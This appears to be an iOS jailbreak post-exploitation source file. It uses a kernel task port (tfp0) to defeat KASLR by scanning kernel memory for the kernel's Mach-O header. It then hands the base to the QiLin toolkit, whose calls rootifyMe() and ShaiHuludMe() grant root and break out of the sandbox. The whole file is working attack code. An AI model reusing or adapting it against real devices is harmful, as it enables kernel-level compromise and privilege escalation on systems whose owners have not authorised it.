#include <mach/mach.h>
#include <Foundation/NSObjCRuntime.h>

#include "kmem.h"
#include "qilin/QiLin.h"

// TODO This is GPL code from somewhere, can't use this
static uint64_t find_kernel_base() {
#define IMAGE_OFFSET 0x2000
#define MACHO_HEADER_MAGIC 0xfeedfacf
#define MAX_KASLR_SLIDE 0x21000000
#define KERNEL_SEARCH_ADDRESS_IOS10 0xfffffff007004000
#define KERNEL_SEARCH_ADDRESS_IOS9 0xffffff8004004000
#define KERNEL_SEARCH_ADDRESS_IOS 0xffffff8000000000
#define ptrSize sizeof(uintptr_t)
    uint64_t addr = KERNEL_SEARCH_ADDRESS_IOS10+MAX_KASLR_SLIDE;
    while (1) {
        char *buf;
        mach_msg_type_number_t sz = 0;
        kern_return_t ret = vm_read(tfp0, addr, 0x200, (vm_offset_t*)&buf, &sz);

        if (ret) {
            goto next;
        }

        if (*((uint32_t *)buf) == MACHO_HEADER_MAGIC) {
            int ret = vm_read(tfp0, addr, 0x1000, (vm_offset_t*)&buf, &sz);
            if (ret != KERN_SUCCESS) {
                NSLog(@"XXX Failed vm_read %i\n", ret);
                goto next;
            }

            for (uintptr_t i=addr; i < (addr+0x2000); i+=(ptrSize)) {
                mach_msg_type_number_t sz;
                int ret = vm_read(tfp0, i, 0x120, (vm_offset_t*)&buf, &sz);

                if (ret != KERN_SUCCESS) {
                    NSLog(@"XXX Failed vm_read %i\n", ret);
                    return 0;
                }
                if (!strcmp(buf, "__text") && !strcmp(buf+0x10, "__PRELINK_TEXT")) {
                    return addr;
                }
            }
        }

    next:
        addr -= 0x200000;
    }
    return 0;
}

void post() {
    NSLog(@"XXX Finding kernel base\n");
    uint64_t kernel_base = find_kernel_base();
    if (!kernel_base) {
        NSLog(@"XXX Could not find kernel base\n");
        return;
    }
    NSLog(@"XXX Starting Qilin with kernel base %llx\n", kernel_base);
    initQiLin(tfp0, kernel_base);
    rootifyMe();
    ShaiHuludMe(0);
    NSLog(@"XXX Qilin initialized");
    NSLog(@"XXX User ID now: %d %d\n", getuid(), geteuid());



}
